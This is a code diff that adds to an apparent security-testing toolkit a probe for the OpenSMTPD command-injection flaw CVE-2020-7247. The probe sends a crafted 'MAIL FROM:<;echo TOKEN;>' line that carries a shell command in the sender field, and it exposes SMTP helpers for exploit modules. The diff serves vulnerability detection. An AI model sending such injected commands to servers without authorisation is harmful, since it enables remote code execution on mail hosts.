@@ -136,3 +136,63 @@ def probe_smtp_open_relay(
                 sock.close()
             except Exception:
                 pass
+
+
+def probe_opensmtpd_cve_2020_7247(
+    host: str,
+    port: int = 25,
+    timeout: float = 5.0,
+    token: str = "kittysploit",
+    helo_name: str = "kittysploit.local",
+) -> Dict[str, object]:
+    """
+    Detect OpenSMTPD CVE-2020-7247: crafted MAIL FROM:<;echo TOKEN;> accepted with 250 Ok.
+    """
+    result: Dict[str, object] = {
+        "vulnerable": False,
+        "detected": False,
+        "banner": "",
+        "mail_response": "",
+        "error": "",
+    }
+    sock: Optional[socket.socket] = None
+    try:
+        sock = _smtp_session(host, port, timeout)
+        banner = _recv_smtp(sock)
+        result["banner"] = banner.strip()[:200]
+        if not banner.startswith("220"):
+            result["error"] = "not_smtp"
+            return result
+        result["detected"] = True
+        _send_smtp(sock, f"HELO {helo_name}")
+        helo = _recv_smtp(sock)
+        if "250" not in helo:
+            result["error"] = f"helo_rejected:{helo.strip()[:80]}"
+            return result
+        _send_smtp(sock, f"MAIL FROM:<;echo {token};>")
+        mail = _recv_smtp(sock)
+        result["mail_response"] = mail.strip()[:200]
+        first = (mail.splitlines() or [""])[0]
+        if "250" in first and "ok" in mail.lower():
+            result["vulnerable"] = True
+        _send_smtp(sock, "QUIT")
+        try:
+            _recv_smtp(sock)
+        except Exception:
+            pass
+        return result
+    except Exception as exc:
+        result["error"] = str(exc)[:200]
+        return result
+    finally:
+        if sock is not None:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+
+# Public aliases for exploit modules that need raw SMTP I/O.
+smtp_session = _smtp_session
+recv_smtp = _recv_smtp
+send_smtp = _send_smtp
